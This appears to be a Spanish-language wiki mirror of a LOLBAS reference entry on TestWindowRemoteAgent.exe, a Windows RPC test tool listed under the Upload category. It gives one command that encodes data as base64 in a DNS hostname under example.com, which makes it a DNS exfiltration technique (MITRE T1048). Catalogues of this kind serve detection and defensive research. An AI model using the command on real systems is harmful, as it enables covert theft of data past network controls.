# LOLBAS: TestWindowRemoteAgent.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Upload`

TestWindowRemoteAgent.exe is the command-line tool to establish RPC

## Comandos

### Attackers may utilize this to exfiltrate data over DNS

Upload · priv: User · T1048

```cmd
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
```

Sends DNS query for open connection to any host, enabling exfiltration over DNS

